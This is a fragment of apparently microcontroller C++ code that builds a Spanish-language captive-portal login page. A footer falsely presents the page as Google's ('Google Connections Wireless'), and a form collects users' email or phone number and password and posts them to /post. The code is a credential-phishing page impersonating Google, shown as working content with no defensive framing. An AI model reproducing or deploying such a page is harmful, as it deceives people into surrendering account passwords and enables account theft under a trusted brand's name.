...
const char* SUBTITLE = "¡Bienvenido!";
const char* TITLE = "Acceso";
...
String footer() {
  return "<br><footer><div><center><p>Copyright&#169; 2024 | All rights reserved Google Connections Wireless.</p></center></div></footer>";
}
...
String index() {
  return header(TITLE) + "<div id=login-text>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b class=username-label> Username:   </b> <center> <input type=text name=username placeholder=Email&nbsp;o&nbsp;número&nbsp;de&nbsp;teléfono></center>" +
         "<b class=password-label> Password: </b> <center> <input type=password name=password placeholder=Contraseña></center>" +
         "<center><input type=submit value=Acceder></center></form>" + footer();
}
